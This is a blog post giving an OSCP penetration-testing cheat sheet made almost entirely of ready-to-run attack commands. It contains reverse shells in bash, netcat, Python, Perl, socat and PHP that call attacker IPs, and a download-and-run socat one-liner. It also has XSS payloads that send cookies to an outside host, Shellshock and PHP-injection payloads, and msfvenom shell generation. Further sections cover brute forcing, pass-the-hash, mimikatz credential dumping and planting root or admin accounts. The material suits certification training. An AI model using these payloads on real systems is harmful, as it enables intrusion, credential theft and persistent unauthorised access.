---
layout: post
title: OSCP Cheat Sheet
date: 2018-10-01 0:0:0 +0800
categories: pentesting
tags: pentesting enumeration network
img: "https://www.offensive-security.com/wp-content/uploads/2016/01/what-is-oscp-post-v8.png" 
---


## Reverse Shells

```bash
# bash
bash -i >& /dev/tcp/192.168.100.113/4444 0>&1

#sh
rm -f /tmp/p; mknod /tmp/p p && nc <attacker-ip> 4444 0/tmp/p

#telnet
rm -f /tmp/p; mknod /tmp/p p && telnet <attacker-ip> 80 0/tmp/p

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# perl 
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Elevate shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# attacker listener
socat file:`tty`,raw,echo=0 tcp-listen:4444  

# victim reverse shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host-ip>:4444  

# download and execute in one line
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<host-ip>:4444  
```

## Web
### Directory Traversal

```bash
dotdotpwn -m http -h <host-ip> -o windows

# create list with directories
dotdotpwn -m stdout -d 8 -o windows > ddp_traversal
```

## XSS

```javascript
'">><script>i=document.createElement("img");i.src='http://10.11.0.61:5555/'+document.cookie;</script>


<script>
new Image().src="http://10.11.0.61:81/bogus.php?output="+document.cookie;
</script>
```

### File Inclusion

```bash
# check vor DAV upload vulns
davtest -url <host-ip> -move
```

Using curl

```bash
curl -X PUT http://website:8080/test.jsp/ -d @- < test.jsp

curl --cookie "JSESSIONID=CFD11DB259AABD57E38AE7ED5935B691" -X PUT http://website:8080/test.jsp/
-d @- < test.jsp
```

Using PHP

```bash
curl -s --data "<?system('ls -la');?>" "http://website/admin.php?ACS_path=php://input%00"
```

Sometimes only traffic on web port allowed

```bash
curl -s --data "<? shell_exec('bash -i >& /dev/tcp/10.11.0.61/443 0>&1') ?>" "http://website/admin.php?ACS_path=php://input%00
```

Read files from system

```bash
https://website/section.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00
```

Using kadismus

```bash
./kadimus -t https://website/section.php?page=php://input%00 --inject-at page -C '<?php echo "pwned"; ?>' -X input
```

### Reverse shell payloads

```php
<?php shell_exec("bash -i >& /dev/tcp/10.11.0.61/5555 0>&1") ?>

<?php shell_exec("nc -e /bin/sh 10.11.0.61 5555") ?>

<?php $sock=fsockopen("10.11.0.61",5555);exec("/bin/sh -i <&3 >&3 2>&3"); ?>

```

## SQLi


### sqlmap

```bash
sqlmap -u "http://website/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381 " --dbms=mysql --technique=U --union-cols=7 --random-agent --dump

sqlmap -u "http://website/edit_period.php?period_id=1 " --cookie="PHPSESSID=h7gtd8seldqt6vfa9igebn4tu1" --dbms=mysql --level=5 --risk=3
```
## Service Cracking & Enumeration

RDP

```bash
ncrack -vv --user offsec -P password-file.txt rdp://<host-ip>
```bash

SSH

```bash
hydra -l root -P password-file.txt <host-ip> ssh
```

FTP

Check wordlist over multiple hosts

```bash
hydra -M ftp_hosts_open.txt -l administrator -P /usr/share/john/password.lst ftp
```

SNMP

```bash
hydra -P password-file.txt -v <host-ip> snmp
```

```bash
# enumerate entire MIB tree
snmpwalk -c public -v1 <host-ip>

# enumerate windows users
snmpwalk -c public -v1 <host-ip> 1.3.6.1.4.1.77.1.2.25

# enumerate running windows processes
snmpwalk -c public -v1 <host-ip> 1.3.6.1.2.1.25.4.2.1.2

# enumerate open TCP ports
snmpwalk -c public -v1 <host-ip> 1.3.6.1.2.1.6.13.1.3

# enumerate installed software
snmpwalk -c public -v1 <host-ip> 1.3.6.1.2.1.25.6.3.1.2
```

```bash
# snmpwalk over list of ip's
while read -r line;
        do `snmpwalk -c public -v1 $line 1.3.6.1.4.1.77.1.2.25 > "$line"_users.txt`
done < ip_list.txt
```

DNS

```bash
#Forward DNS Lookup Brute Force
for ip in $(cat subdomain_list.txt);do host $ip.megacorpone.com;done

#Reverse DNS Lookup Brute Force
for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"

#Script for doing zone transfer
for server in $(host -t ns $1 |cut -d" " -f4)
do
        host -l $1 $server |grep "has address"
done

#dnsrecon
dnsrecon -d megacorpone.com -t axfr
```

LDAP

```bash
ldapsearch -h <host-ip> -p 389 -w <password> -x -b "dc=<domain>,dc=local
```

AJP

```bash
nmap -p 8009 <host-ip> --script ajp-brute

nmap -p 8009 <host-ip> --script ajp-request --script-args method=GET
```

NetBios

```bash
nbtscan <host-ip>
```

SMB

```bash
smbmap -d <domain> -H <host-ip> -R

mount -t cifs "//<ip-address>/Share" smbmount

smbclient "\\\\<ip-address>\Share"
```

RPC


```bash
rpcclient <ip address> -U “” -N

rpcinfo -p <target ip>
```

## Password Cracking

TightVNC

```posh
C:\Users\ADMINI~1\Desktop\Tools>vncpwd.exe 2151D3722874AD0C

*VNC password decoder 0.2
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or longer than 8 chars)

  Password:   <password>
```

SAM

```bash
pwdump system SAM
```

## Password Bruteforce

HTTP

```bash
medusa -h <host-ip> -u {jeff,admin} -P mega-mangled -M http -n 80 -m DIR:/xampp -T 3
```

RDP

```bash
ncrack -vv --user administrator -P ~/PASSWD/mega-mangled rdp://<host-ip>
```


```bash
python crowbar.py -b rdp -s <host-ip>/32 -U ~/targets/0_usernames -C ~/targets/0_passwords
```

## Files

### Windows

Files containing passwords

```posh
# has to be decrypted with gpp-decrypt
C:\Windows\SYSVOL\sysvol\<domain-name>\Policies\{43383995-A780-486C-83E1-469CB7FF2BF4}\Machine\Preferences\Groups>more Groups.xml

C:\Windows\repair\SAM && C:\Windows\repair\system
```

Registry

```bash
# TightVNC server
reg query HKLM\Software\TightVNC\Server
```



## Msfvenom Payloads

### Windows

```bash

# if exes aren't allowed to upload or not executable a vbs script could be useful
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=6666 EXITFUNC=thread -f loop-vbs

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=18999 -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=6666 EXITFUNC=process -e PexFnstenvSub -f python

msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=6666 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e PexAlphaNum -f python

# perl windows reverse shell
msfvenom -p windows/shell_reverse_tcp LPORT=6666 LHOST=10.11.0.61 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f perl

# javascript payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.61 LPORT=444 -f js_le -e generic/none
```

## Remote Exploits
### Shellshock

```bash
python 34900.py payload=reverse pages=/cgi-bin/admin.cgi rhost=<host-ip> lhost=10.11.0.61 lport=555
```

manually

```bash
 curl -H "User-Agent: () { test;};/bin/bash -i >& /dev/tcp/10.11.0.61/80 0>&1" http://website/cgi-bin/printenv
```

### shocker

```bash
python shocker.py --Host <host-ip>
```

## Local Privilege Escalation
### Windows


Hash Injection

```bash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a //<host-ip> cmd.exe

mimikatz # sekurlsa::pth /user:Administrateur /domain:<domain> /ntlm:cc36cf7a8514893efccd332446158b1a

xfreerdp /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 /v:<host-ip> -O
```

User and Domains

```bash
net view /DOMAIN:WORKGROUP
net group "Domain Admins"
net localgroup "Administrators"
```

Add admin user

```bash
net user /add low <password>
net localgroup administrators low /add
```

Insecure Files and Services

```c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main ()
{
        int i;
        i=system ("net localgroup administrators low /add");
        return 0;
}

// compile with i686-w64-mingw32-gcc

```


```posh
# show user rights for file 
icacls scsiaccess.exe

# finding services that user robert is allowed to modify
accesschk.exe -uwcqv "robert" * /accepteula

# finding scheduled services
schtasks /query /fo LIST /v

# link running processes to started services
tasklist /SVC

# search for specific filetypes with string password
findstr /si password *.xml *.ini *.txt

# grepping dir for specific strings
dir /s *pass* == *cred* == *vnc* == *.config*
```

```bash
# connect null session
net use \\<ip-address>\$Share “” /u:””
```

#### Registry

```posh
reg query HKLM\SYSTEM\CurrentControlSet\Services

# grep registry for passwords
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
```

#### sc

```posh
sc qc Spooler

sc config "Spooler" binpath= "net user <username> <password> /add"

net start upnphost
```





#### wmic
```posh
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

wmic service list full

wmic /output:c:\Inetpub\wwwroot\services.txt service lst /format:hform
```


See open ports with running services:
```bash
# see ports with running PID's
netstat -ano

# see matching services to PID's
tasklist
```

## Linux


Users

Bash script for adding user with admin rights

```bash
#!/bin/sh
/usr/sbin/adduser agentcooper
/usr/bin/passwd agentcooper
/usr/sbin/usermod -aG root agentcooper
```

It's often difficult tu use built-in utilities within limited shell, more robust to simply add strings to files:

```bash
#!/bin/sh
echo "agentcooper:\$1\$AbCD4536\$ujyfop5giNd2eAFbEo0o6/:16903:0:99999:7:::" >> /etc/shadow
echo "agentcooper:x:0:0:::/bin/bash" >> /etc/passwd
echo "agentcooper:x:0:" >> /etc/group
```

Insecure files and Services

Find writable directories

```bash
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```

See ports with services

```bash
netstat -tulpn`
```

## Access
### File Transfer

Create VBS based wget tool for windows 

```posh
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```


### Linux


SSH

Port Forwarding via Socks Proxy

```bash
# Creating Socks Proxy with SSH
ssh -o ServerAliveInterval=60 -D 127.0.0.1:8888 root@192.168.178.95

# Doing Web based requests using the created socks proxy
curl --socks5 localhost:8888 http://<host-ip>

# By editing proxychains config can be used for nearly any tool
proxychains nmap -sT -Pn --top-ports=20 <host-ip>
```

RDP

```bash
xfreerdp /u:<user> /d:WORKGROUP /p:<password> /v:<host-ip>
```

psexec

```bash
winexe -U <user>%<password> //<host-ip> cmd.ex
```

### Windows

plink

Forward ports to attacker machine:

```posh
plink.exe -l root <host-ip> -R 8443:127.0.0.1:8443 -R 8014:127.0.0.1:8014 -R 9090:127.0.0.1:9090
```

nc ncat netcat

```bash
# start encrypted bind shell on port 444
ncat --exec cmd.exe --allow 10.11.0.61 -vnl 4444 --ssl

# connect to this shell
ncat -v <host-ip> 4444 --ss
```


## Tools

mimikatz

```posh
#dump all passwords
sekurlsa::logonPasswords full
```

openssl

```bash
# creating MD5 linux hash
openssl passwd -1 -salt AbCD4536 <password>
```

psexec

```posh
# create remote cmd shell on another host
psexec \\<host-ip> -u <domain\\user> -p <password> cmd
```

Powershell

```posh
# Invoke Powershell script without changing cmd context
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```

nmap

```bash
nmap -sT --script whois-ip,ssh-hostkey,banner,dns-zone-transfer,ftp-bounce,ftp-syst,ftp-anon
,finger,pptp-version,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth
,http-awstatstotals-exec,http-backup-finder,http-bigip-cookie,http-config-backup,http-devframework,http-headers,htt
p-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-mobileversion-checker,http-open-proxy,http-php-vers
ion,http-robots.txt,http-robtex-shared-ns,http-security-headers,http-shellshock,http-title,http-vhosts,http-enum,im
ap-capabilities,imap-ntlm-info,ms-sql-empty-password,ms-sql-info,ms-sql-ntlm-info,mysql-info,mysql-empty-password,m
ysql-databases,mysql-variables,mysql-enum,pop3-capabilities,pop3-ntlm-info,rusers,smb-ls,smb-mbenum,smb-protocols,s
mtp-commands,smtp-ntlm-info,smtp-open-relay,smtp-strangeport,ssl-cert,ssl-cert-intaddr,ssl-date,vnc-info,vnc-title
<host-ip>
```


```bash
nmap -Pn -p- -vv <ip address>
nmap -Pn -p- -sU -vv <ip address>
nmap -Pn -sV -O -pT:{TCP ports},U:{UDP ports} -script *vuln* <ip address>
```

Compiling

```bash
# create shared library
gcc overwrite_puts.c -o overw_puts -shared -fPIC

# crosscompiling from linux to exe for 32-bit
i686-w64-mingw32-gcc 646.c -lws2_32 -o 646.exe

Grep

# grep for IP addresses
grep -oE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
```

Tcpdump

```bash
# using -X to output raw traffic
tcpdump -nX -r password_cracking_filtered.pcap | grep -A10 GET
```

### Tcpdump-Filter

```bash
# extract IP addresses from pcap
tcpdump -n -r dump.pcap | awk -F" " '{print $3}' | sort -u | head`

# filter for http requests
tcpdump -A -s 0 'tcp port 10443 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf>>2)) != 0)' -i eth0

# filter destination host
tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap

# filter for source host
tcpdump -n src host 172.16.40.10 -r password_cracking_filter

# filter port
tcpdump -n port 81 -r password_cracking_filtered.pcap

# extract only ACK and PUSH packets
tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap


```

### iptables


```bash
# create traffic counter for specific net
iptables -N subnet_scan
iptables -A INPUT -d 10.11.1.0/24 -j subnet_scan
iptables -vL INPUT
```

